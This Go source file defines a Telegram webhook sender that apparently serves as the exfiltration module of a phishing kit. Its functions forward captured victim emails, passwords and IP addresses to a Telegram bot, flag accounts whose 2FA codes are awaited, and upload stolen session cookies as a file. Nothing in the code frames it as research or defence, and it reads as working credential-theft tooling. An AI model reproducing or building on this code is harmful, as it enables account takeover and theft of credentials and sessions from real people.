package webhook

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html"
	"mime/multipart"
	"net/http"
	"time"
)

type TelegramSender struct {
	Token  string
	ChatID string
}

func NewSender(token, chatID string) *TelegramSender {
	return &TelegramSender{Token: token, ChatID: chatID}
}

func (t *TelegramSender) SendCredentials(source, email, password, ip string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("🔐 <b>New Submission</b>\n\nSource: %s\nEmail: <code>%s</code>\nPassword: <code>%s</code>\nIP: %s\nTime: %s",
		html.EscapeString(source), 
		html.EscapeString(email), 
		html.EscapeString(password), 
		html.EscapeString(ip), 
		time.Now().Format("2006-01-02 15:04:05"))
	
	return t.send(msg)
}

func (t *TelegramSender) Send2FARequired(source, email, ip string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("⚠️ <b>2FA Required</b>\n\nSource: %s\nEmail: <code>%s</code>\nIP: %s\nTime: %s\nStatus: <i>Waiting for verification code</i>",
		html.EscapeString(source), 
		html.EscapeString(email), 
		html.EscapeString(ip), 
		time.Now().Format("2006-01-02 15:04:05"))
	
	return t.send(msg)
}

func (t *TelegramSender) SendSession(source, email, cookies string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("✅ <b>Session Captured</b>\n\nSource: %s\nEmail: <code>%s</code>\nTime: %s",
		html.EscapeString(source), 
		html.EscapeString(email), 
		time.Now().Format("2006-01-02 15:04:05"))
	
	if err := t.send(msg); err != nil {
		return err
	}
	
	return t.sendFile(fmt.Sprintf("%s_session.txt", email), cookies)
}

func (t *TelegramSender) send(msg string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
	data, _ := json.Marshal(map[string]string{
		"chat_id": t.ChatID,
		"text":    msg,
		"parse_mode": "HTML",
	})
	
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API error: %s", resp.Status)
	}

	return nil
}

func (t *TelegramSender) sendFile(filename, content string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.Token)
	
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	
	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	
	if _, err := part.Write([]byte(content)); err != nil {
		return err
	}
	
	if err := writer.WriteField("chat_id", t.ChatID); err != nil {
		return err
	}
	
	if err := writer.WriteField("caption", filename); err != nil {
		return err
	}
	
	if err := writer.Close(); err != nil {
		return err
	}

	resp, err := http.Post(url, writer.FormDataContentType(), body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API error (file): %s", resp.Status)
	}

	return nil
}